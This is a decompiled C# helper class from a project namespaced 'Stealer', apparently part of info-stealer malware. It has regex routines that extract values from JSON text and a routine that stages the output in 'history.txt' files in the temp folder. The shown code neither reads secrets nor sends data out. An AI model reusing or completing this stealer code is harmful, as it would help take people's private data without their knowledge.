using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace Stealer
{
	// Token: 0x0200000B RID: 11
	internal class Common
	{
		// Token: 0x0600002F RID: 47 RVA: 0x000035F0 File Offset: 0x000017F0
		public static string Extract(string target, string content)
		{
			string text = string.Empty;
			Regex regex = new Regex("\"" + target + "\"\\s*:\\s*(\"(?:\\\\\"|[^\"])*?\")");
			MatchCollection matchCollection = regex.Matches(content);
			foreach (object obj in matchCollection)
			{
				Match match = (Match)obj;
				GroupCollection groups = match.Groups;
				text = groups[1].Value;
			}
			text = text.Replace("\"", "");
			return text;
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00003690 File Offset: 0x00001890
		public static List<string> RegexJson(string content, string regex)
		{
			List<string> list = new List<string>();
			MatchCollection matchCollection = new Regex(regex, RegexOptions.Compiled).Matches(content);
			foreach (object obj in matchCollection)
			{
				Match match = (Match)obj;
				if (match.Success)
				{
					list.Add(match.Groups[1].Value);
				}
			}
			return list;
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00003714 File Offset: 0x00001914
		public static void WriteToFile(string writeText)
		{
			Common.fileName = User.tempFolder + "\\history.txt";
			if (File.Exists(Common.fileName))
			{
				string text = File.ReadAllText(Common.fileName);
				if ((text.Length + writeText.Length) / 1024 > 8000)
				{
					Common.fileCounter++;
					Common.fileName = string.Concat(new object[]
					{
						User.tempFolder,
						"\\history_",
						Common.fileCounter,
						".txt"
					});
					StreamWriter streamWriter = new StreamWriter(Common.fileName, true);
					streamWriter.WriteLine(writeText);
					streamWriter.Close();
					return;
				}
				StreamWriter streamWriter2 = new StreamWriter(Common.fileName, true);
				streamWriter2.WriteLine(writeText);
				streamWriter2.Close();
			}
		}

		// Token: 0x04000032 RID: 50
		private static int fileCounter = 1;

		// Token: 0x04000033 RID: 51
		public static string fileName = string.Empty;
	}
}
